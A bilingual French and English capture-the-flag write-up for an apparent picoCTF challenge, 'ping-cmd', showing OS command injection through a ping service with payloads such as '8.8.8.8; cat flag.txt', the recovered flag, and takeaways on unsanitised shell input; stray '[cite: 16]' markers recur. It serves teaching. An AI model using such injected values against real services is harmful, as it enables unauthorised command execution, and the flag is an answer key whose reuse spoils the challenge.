# Write-Up : ping-cmd

---

## 🇫🇷 Version Française

### 📋 Informations du Challenge

- **Nom du challenge :** ping-cmd[cite: 16]
- **Plateforme / Événement :** picoCTF 2026[cite: 16]
- **Auteur :** Yahaya Meddy[cite: 16]
- **Catégorie :** General Skills[cite: 16]
- **Difficulté :** Easy[cite: 16]

---

### 📝 Description

> _"Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input? You can connect to the service here nc xebec.cylabacademy.net 37938"_[cite: 16]

---

### 🔍 Étape 1 : Connexion et identification de la vulnérabilité

On se connecte au serveur distant en utilisant l'utilitaire Netcat :

```bash
nc xebec.cylabacademy.net 37938
```

En fournissant l'adresse IP `8.8.8.8`, le serveur exécute une commande système `ping 8.8.8.8` en arrière-plan.

---

### 🛠️ Étape 2 : Injection de commande et énumération du répertoire

En s'appuyant sur les indices du challenge (_"The program uses a shell command behind the scenes"_ et _"Sometimes, You can run more than one command at a time"_)[cite: 16], on comprend que les entrées utilisateur ne sont pas filtrées avant d'être passées au shell.

On exploite cette faille d'**Injection de Commandes (OS Command Injection)** en utilisant le séparateur de commande point-virgule (`;`) pour lister le contenu du répertoire courant :

```text
8.8.8.8;ls
```

**Résultat :**
La commande `ping` s'exécute normalement, suivie immédiatement par la commande `ls` qui révèle les fichiers présents :

- `flag.txt`
- `script.sh`

---

### 🚩 Étape 3 : Lecture du Flag

On réitère l'injection de commande en substituant `ls` par `cat flag.txt` pour afficher le contenu du fichier flag :

```text
8.8.8.8; cat flag.txt
```

**Flag :** `academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_7c0b936f}`

---

### 💡 Key Takeaways / Notions retenues

- Les vulnérabilités d'**Injection de Commandes OS (Command Injection)** apparaissent lorsque des données saisies par l'utilisateur sont concaténées directement dans un appel shell (`system()`, `exec()`, etc.) sans assainissement (_sanitization_).
- L'utilisation de métacaractères shell comme `;`, `&&`, `||` ou `|` permet de chaîner et d'exécuter des commandes système arbitraires.

---

---

## 🇬🇧 English Version

### 📋 Challenge Info

- **Challenge Name:** ping-cmd[cite: 16]
- **Platform / Event:** picoCTF 2026[cite: 16]
- **Author:** Yahaya Meddy[cite: 16]
- **Category:** General Skills[cite: 16]
- **Difficulty:** Easy[cite: 16]

---

### 📝 Description

> _"Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input? You can connect to the service here nc xebec.cylabacademy.net 37938"_[cite: 16]

---

### 🔍 Step 1: Service Connection & Vulnerability Identification

We connect to the interactive remote service using Netcat:

```bash
nc xebec.cylabacademy.net 37938
```

Submitting `8.8.8.8` triggers the execution of a background shell command running `ping 8.8.8.8`.

---

### 🛠️ Step 2: Command Injection & Directory Enumeration

Referencing the challenge hints (_"The program uses a shell command behind the scenes"_ and _"Sometimes, You can run more than one command at a time"_)[cite: 16], we identify that user input is not properly sanitized before invocation.

We exploit an **OS Command Injection** vulnerability using the semicolon (`;`) command chaining operator to enumerate directory contents:

```text
8.8.8.8;ls
```

**Result:**
The server executes the `ping` command followed by `ls`, revealing two target files:

- `flag.txt`
- `script.sh`

---

### 🚩 Step 3: Flag Extraction

We repeat the command injection payload, replacing `ls` with `cat flag.txt` to display the contents of the flag file:

```text
8.8.8.8; cat flag.txt
```

**Flag:** `academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_7c0b936f}`

---

### 💡 Key Takeaways

- **OS Command Injection** flaws occur when application code passes unvalidated user input directly into system shell command interpreters (`system()`, `exec()`, etc.).
- Shell metacharacters such as `;`, `&&`, `||`, or `|` can be leveraged to sequence and execute arbitrary OS commands.
